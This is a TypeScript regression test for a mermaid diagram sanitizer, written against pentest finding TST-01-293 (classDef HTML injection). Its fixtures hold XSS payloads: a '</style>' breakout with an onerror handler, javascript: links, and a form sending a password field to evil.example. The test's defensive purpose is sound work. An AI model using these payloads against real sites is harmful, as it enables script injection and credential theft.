// @vitest-environment jsdom
/**
 * Regression test for Helix Cyber pentest finding TST-01-293
 * (GHSA-ghcm-xqfw-q4vr: classDef in mermaid state diagrams -> HTML injection).
 *
 * Renders attacker-style diagram text through the real mermaid package with
 * the app's config, then asserts the markup MermaidDiagramImpl injects into
 * the DOM carries no injected elements, while benign diagrams are untouched.
 */
import { beforeAll, describe, expect, it } from 'vitest'
import mermaid from 'mermaid'
import { MERMAID_CONFIG } from './mermaidConfig'
import { sanitizeMermaidSvg } from './sanitizeMermaidSvg'

let seq = 0
const render = async (code: string): Promise<string> => {
  const { svg } = await mermaid.render(`tst01293-${++seq}`, code)
  return svg
}

// What ends up in the page: dangerouslySetInnerHTML is innerHTML.
const mount = (markup: string): HTMLDivElement => {
  const host = document.createElement('div')
  host.innerHTML = markup
  return host
}

const CLASSDEF_POC = [
  'stateDiagram-v2',
  '  classDef pwn fill:#f00</style><img src=x onerror=alert(document.domain)>',
  '  A --> B',
  '  class A pwn',
].join('\n')

describe('TST-01-293: mermaid diagram output is sanitised before injection', () => {
  beforeAll(() => {
    // jsdom has no SVG layout engine; mermaid only needs plausible sizes.
    const proto = window.SVGElement.prototype as any
    proto.getBBox ??= () => ({ x: 0, y: 0, width: 10, height: 10 })
    proto.getComputedTextLength ??= () => 10
    mermaid.initialize(MERMAID_CONFIG)
  })

  it('classDef </style> breakout PoC injects no elements into the page', async () => {
    const raw = await render(CLASSDEF_POC)
    const host = mount(sanitizeMermaidSvg(raw))

    expect(host.children).toHaveLength(1)
    expect(host.firstElementChild?.tagName.toLowerCase()).toBe('svg')
    expect(host.querySelectorAll('img, image, iframe, script, a')).toHaveLength(0)
    expect(host.querySelectorAll('style')).toHaveLength(1)
    expect(host.querySelector('style')?.textContent).not.toMatch(/[<>]/)
    for (const el of Array.from(host.querySelectorAll('*'))) {
      for (const attr of Array.from(el.attributes)) {
        expect(attr.name).not.toMatch(/^on/i)
        expect(attr.value).not.toMatch(/javascript:/i)
      }
    }
  })

  it('drops content smuggled outside the root <svg> and extra <style> elements', () => {
    const host = mount(
      sanitizeMermaidSvg(
        '<svg xmlns="http://www.w3.org/2000/svg"><style>#a{fill:red}</style>' +
          '<g><style>body{display:none}</style><a href="javascript:alert(1)"><text>x</text></a>' +
          '<foreignObject><div><img src="https://evil.example/p.gif"><span onclick="alert(1)">label</span></div></foreignObject>' +
          '</g></svg><img src=x onerror=alert(1)><form action="https://evil.example"><input name=pw></form>',
      ),
    )

    expect(host.children).toHaveLength(1)
    expect(host.querySelectorAll('style')).toHaveLength(1)
    expect(host.querySelector('style')?.textContent).toBe('#a{fill:red}')
    expect(host.querySelectorAll('img, form, input')).toHaveLength(0)
    expect(host.innerHTML).not.toMatch(/javascript:|onerror|onclick|evil\.example/i)
    // Legitimate label HTML inside foreignObject survives.
    expect(host.querySelector('foreignObject span')?.textContent).toBe('label')
  })

  it('leaves benign diagrams (incl. HTML labels) byte-for-byte unchanged', async () => {
    const raw = await render('flowchart TD\n  A[Hello] --> B{World}\n  B --> C[<b>bold</b>]')
    const clean = sanitizeMermaidSvg(raw)
    expect(mount(clean).innerHTML).toBe(mount(raw).innerHTML)
    expect(mount(clean).querySelectorAll('foreignObject div')).not.toHaveLength(0)
  })

  it('directives cannot override CSS-bearing config keys', () => {
    expect(MERMAID_CONFIG.securityLevel).toBe('strict')
    expect(MERMAID_CONFIG.secure).toEqual(
      expect.arrayContaining(['securityLevel', 'themeCSS', 'fontFamily', 'secure']),
    )
  })
})
